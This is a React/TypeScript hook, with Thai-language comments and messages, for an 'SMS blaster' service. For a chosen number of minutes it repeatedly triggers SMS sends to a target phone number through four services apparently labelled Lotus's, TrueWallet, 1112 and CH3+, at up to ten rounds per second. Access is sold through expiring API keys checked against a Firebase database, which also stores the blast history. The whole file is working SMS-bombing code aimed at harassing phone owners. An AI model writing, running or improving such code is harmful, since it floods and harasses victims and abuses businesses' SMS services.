
import { useState, useRef, useEffect } from "react";
import { useToast } from "@/components/ui/use-toast";
import axios from "axios";
import { api1, api2, api3, api4 } from "@/services/smsAPIs";

interface LogEntry {
  timestamp: string;
  phone: string;
  status: 'success' | 'error';
  message: string;
}

interface PhoneReport {
  reason: string;
  count: number;
}

interface SMSHistoryEntry {
  phone: string;
  startTime: string;
  endTime: string;
  totalRounds: number;
  successCount: number;
  failedCount: number;
  duration: number;
  speed: "slow" | "normal" | "fast" | "ultra";
  status: "active" | "completed";
}

export const useSMSBlaster = () => {
  const [phoneNumber, setPhoneNumber] = useState("");
  const [minutes, setMinutes] = useState("1");
  const [loading, setLoading] = useState(false);
  const [logs, setLogs] = useState<LogEntry[]>([]);
  const [remainingTime, setRemainingTime] = useState<number>(0);
  const [apiKey, setApiKey] = useState("");
  const [showKeyInput, setShowKeyInput] = useState(false);
  const [phoneReport, setPhoneReport] = useState<PhoneReport | null>(null);
  const [phoneHistory, setPhoneHistory] = useState<Set<string>>(new Set());
  const [speed, setSpeed] = useState<"slow" | "normal" | "fast" | "ultra">("normal");
  const timerRef = useRef<NodeJS.Timeout>();
  const { toast } = useToast();

  const speedMap = {
    slow: 1000,
    normal: 500,
    fast: 200,
    ultra: 100
  };

  const addLog = (phone: string, status: 'success' | 'error', message: string) => {
    const newLog = {
      timestamp: new Date().toLocaleTimeString(),
      phone,
      status,
      message
    };
    setLogs(prev => [newLog, ...prev].slice(0, 100));
    setPhoneHistory(prev => new Set(prev.add(phone)));
  };

  // บันทึกเบอร์ที่ถูกบล็อก
  const saveBlockedPhone = async (phone: string) => {
    try {
      await axios.post("https://goak-71ac8-default-rtdb.firebaseio.com/blocked.json", {
        phone,
        timestamp: new Date().toISOString(),
        reason: "ถูกบล็อกจากการยิง SMS"
      });
    } catch (error) {
      console.error("Error saving blocked phone:", error);
    }
  };

  const startSMSBlast = async () => {
    setLoading(true);
    const totalSeconds = parseInt(minutes) * 60;
    setRemainingTime(totalSeconds);
    const startTime = new Date().toISOString();
    let successCount = 0;
    let failedCount = 0;
    
    // บันทึกประวัติเริ่มต้นการยิง
    const historyId = `history_${Date.now()}`;
    const historyEntry: SMSHistoryEntry = {
      phone: phoneNumber,
      startTime,
      endTime: '',
      totalRounds: 0,
      successCount: 0,
      failedCount: 0,
      duration: parseInt(minutes),
      speed,
      status: "active"
    };

    try {
      await axios.put(
        `https://goak-71ac8-default-rtdb.firebaseio.com/history/${historyId}.json`,
        historyEntry
      );
    } catch (error) {
      console.error("Error saving initial history:", error);
    }

    let timeLeft = totalSeconds;
    const smsInterval = setInterval(async () => {
      if (timeLeft <= 0) {
        clearInterval(smsInterval);
        setLoading(false);
        setRemainingTime(0);

        // อัพเดทประวัติเมื่อจบการยิง
        const endTime = new Date().toISOString();
        const finalHistory: Partial<SMSHistoryEntry> = {
          endTime,
          totalRounds: Math.floor((successCount + failedCount) / 4),
          successCount,
          failedCount,
          status: "completed"
        };

        try {
          await axios.patch(
            `https://goak-71ac8-default-rtdb.firebaseio.com/history/${historyId}.json`,
            finalHistory
          );

          // บันทึกเบอร์ที่ถูกบล็อก
          if (failedCount > successCount) {
            await saveBlockedPhone(phoneNumber);
          }
        } catch (error) {
          console.error("Error updating final history:", error);
        }

        addLog(phoneNumber, 'success', `🏁 สิ้นสุดการส่ง SMS แล้ว`);
        toast({
          title: "สำเร็จ",
          description: `สิ้นสุดการส่ง SMS ไปยังหมายเลข ${phoneNumber}`,
        });
        return;
      }

      const sendPromises = [
        { api: api1, name: 'Lotus\'s' },
        { api: api2, name: 'TrueWallet' },
        { api: api3, name: '1112' },
        { api: api4, name: 'CH3+' }
      ].map(async ({ api, name }) => {
        try {
          await api(phoneNumber);
          successCount++;
          addLog(phoneNumber, 'success', `ส่ง SMS สำเร็จผ่าน ${name}`);
        } catch (error) {
          failedCount++;
          addLog(phoneNumber, 'error', `⚠ ไม่สามารถส่ง SMS ผ่าน ${name}`);
        }
      });

      await Promise.all(sendPromises);
      
      // อัพเดทประวัติระหว่างยิง
      try {
        await axios.patch(
          `https://goak-71ac8-default-rtdb.firebaseio.com/history/${historyId}.json`,
          {
            successCount,
            failedCount,
            totalRounds: Math.floor((successCount + failedCount) / 4)
          }
        );
      } catch (error) {
        console.error("Error updating history during blast:", error);
      }

      timeLeft--;
      setRemainingTime(timeLeft);
    }, speedMap[speed]);

    timerRef.current = smsInterval;
  };

  const validatePhoneNumber = (number: string) => {
    const regex = /^0\d{9}$/;
    return regex.test(number);
  };

  const checkPhoneReport = async (phone: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/reports/${phone}.json`);
      if (response.data) {
        setPhoneReport(response.data);
        setShowKeyInput(true);
        toast({
          title: "⚠️ คำเตือน",
          description: `เบอร์นี้ถูกรายงานว่า: ${response.data.reason}`,
          variant: "destructive",
        });
      } else {
        setShowKeyInput(true);
      }
    } catch (error) {
      console.error("Error checking phone report:", error);
      setShowKeyInput(true);
    }
  };

  const validateApiKey = async (key: string) => {
    try {
      const response = await axios.get(`https://goak-71ac8-default-rtdb.firebaseio.com/keys/${key}.json`);
      if (response.data && response.data.active) {
        const expireDate = new Date(response.data.expireDate);
        if (expireDate > new Date()) {
          return true;
        }
        toast({
          title: "API Key หมดอายุ",
          description: "กรุณาติดต่อแอดมินเพื่อต่ออายุ Key",
          variant: "destructive",
        });
        return false;
      }
      toast({
        title: "API Key ไม่ถูกต้อง",
        description: "กรุณาตรวจสอบ Key ของท่าน",
        variant: "destructive",
      });
      return false;
    } catch (error) {
      console.error("Error validating API key:", error);
      return false;
    }
  };

  const handlePhoneSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validatePhoneNumber(phoneNumber)) {
      toast({
        title: "หมายเลขโทรศัพท์ไม่ถูกต้อง",
        description: "กรุณากรอกหมายเลขโทรศัพท์ 10 หลัก ที่ขึ้นต้นด้วย 0",
        variant: "destructive",
      });
      return;
    }

    await checkPhoneReport(phoneNumber);
  };

  const handleApiKeySubmit = async () => {
    if (await validateApiKey(apiKey)) {
      startSMSBlast();
    }
  };

  return {
    phoneNumber,
    setPhoneNumber,
    minutes,
    setMinutes,
    loading,
    logs,
    remainingTime,
    apiKey,
    setApiKey,
    showKeyInput,
    phoneReport,
    phoneHistory,
    speed,
    setSpeed,
    handlePhoneSubmit,
    handleApiKeySubmit,
  };
};
